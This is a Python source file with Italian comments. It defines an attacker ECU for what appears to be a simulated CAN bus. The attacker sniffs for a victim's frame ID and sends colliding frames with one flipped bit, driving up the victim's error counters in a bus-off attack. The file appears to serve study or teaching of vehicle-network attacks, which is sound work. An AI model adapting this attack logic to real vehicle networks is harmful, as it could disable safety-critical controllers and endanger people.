from ecu_base import ECU, Role, NodeState, ErrorFlagType, ERROR_FLAG_ID
import can
import time

# --- Funzioni per Bit Flipping --- #

def flip_first_one_from_left(byte_val: int) -> int:
    """
    Cerca il primo bit a 1 da sinistra (bit 7 → 0) e lo mette a 0.
    Se il byte è 0x00, lo lascia invariato.
    """
    for bit in range(7, -1, -1):
        if byte_val & (1 << bit):
            return byte_val & ~(1 << bit)
    return byte_val


# --- Classe Attacker --- #

class AttackerECU(ECU):
    def __init__(self, victim_id: int, *args, **kwargs):
        # L'Attaccante non trasmette ciclicamente, quindi nel main gli passerai period_sec=0.0
        super().__init__(*args, **kwargs)
        self.victim_id = victim_id

    # L'Attaccante non trasmette periodicamente
    def _tx_loop(self):
        while not self._stop:
            time.sleep(0.1)

    def _rx_loop(self):
        """
        RX loop specializzato per l'attaccante.
        Non gestisce gli ERROR_FLAG qui, così gli ERROR_FLAG rilevanti
        vengono letti nel recv() dentro _handle_normal_frame dopo l'attacco.
        """
        while not self._stop:
            try:
                msg = self.bus.recv(timeout=0.1)
            except can.CanError:
                continue

            if msg is None:
                continue

            # NON gestire qui gli ERROR_FLAG (li guarda _handle_normal_frame subito dopo TX)
            if msg.arbitration_id == ERROR_FLAG_ID:
                # Lascialo passare / ignoralo a livello logico
                continue

            # Tutto il resto passa alla logica dell'attaccante
            self._handle_normal_frame(msg)

    def _handle_normal_frame(self, msg: can.Message):
        """
        L'Attaccante sniffa il bus e risponde solo al frame della Vittima.
        """
        if msg.arbitration_id != self.victim_id:
            # Ignora tutti i messaggi che non sono il bersaglio
            return

        # Costruisci il payload modificato (bit-flip sul primo 1 da sinistra del primo byte)
        modified_data = bytearray(msg.data)
        if len(modified_data) > 0:
            modified_data[0] = flip_first_one_from_left(modified_data[0])

        att_msg = can.Message(
            arbitration_id=self.victim_id,  # Stesso ID per garantire la collisione
            data=modified_data,
            is_extended_id=msg.is_extended_id
        )

        try:
            # Fase di trasmissione dell'attaccante
            self.currently_transmitting = True
            self.last_tx_data = bytes(modified_data)
            self.last_tx_time = time.time()

            self.bus.send(att_msg)
            print(
                f"[{self.name}] ATTACK: TX_V={msg.data.hex().upper()} "
                f"→ TX_A={att_msg.data.hex().upper()}"
            )

            # Subito dopo l'invio, l'attaccante "ascolta" un eventuale ERROR FLAG
            error_detected = False
            response_msg = self.bus.recv(timeout=0.05)

            if response_msg is not None and response_msg.arbitration_id == ERROR_FLAG_ID:
                # Qualcuno ha emesso un Error Flag subito dopo la nostra TX
                flag_type = ErrorFlagType(response_msg.data[0])
                if flag_type == ErrorFlagType.ACTIVE:
                    # L'attaccante interpreta questo come BIT ERROR sulla propria TX
                    self._on_tx_error()   # TEC +8 (come definito in ECU._on_tx_error)
                    error_detected = True
                    print(
                        f"[{self.name}] att → TEC +8: "
                        f"Rilevato ERROR FLAG ACTIVE (vittima in ERROR_ACTIVE)."
                    )

            if not error_detected:
                # Nessun ERROR_FLAG ACTIVE visto → TX considerato OK
                # (oppure vittima in ERROR_PASSIVE: invia solo 6 recessivi che non bucano la TX)
                self._on_tx_success()    # TEC -1 (come da logica ECU)
                print(f"[{self.name}] att → TEC -1: (TX successo).")

        except can.CanError as e:
            print(f"[{self.name}] Errore invio frame attacco: {e}")
            self._on_tx_error()  # Errore locale di invio → TEC++

        finally:
            time.sleep(0.01)
            self.currently_transmitting = False
